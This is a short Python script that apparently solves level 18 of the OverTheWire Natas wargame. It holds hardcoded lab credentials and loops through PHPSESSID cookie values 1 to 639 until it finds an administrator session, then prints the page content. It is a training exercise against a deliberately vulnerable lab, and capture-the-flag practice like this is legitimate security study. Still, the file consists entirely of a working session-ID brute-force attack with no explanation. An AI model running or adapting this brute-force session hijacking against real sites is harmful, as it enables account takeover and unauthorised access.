import requests
from bs4 import BeautifulSoup
auth = ("natas18", "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP")
url = "http://natas18.natas.labs.overthewire.org/"
print("Strat Attacking ,,,")
for i in range(1, 640):
    
        cookies = {"PHPSESSID" : str(i)}
        response = requests.get(url, auth=auth, cookies=cookies)
        if "You are logged in as a regular user" not in response.text:
            text = response.text
            soup = BeautifulSoup(text)
            tx = soup.find(id="content")
            result=tx.get_text()
            print(result)
            #print("Finded a password !")
            #print(response.text)
            break
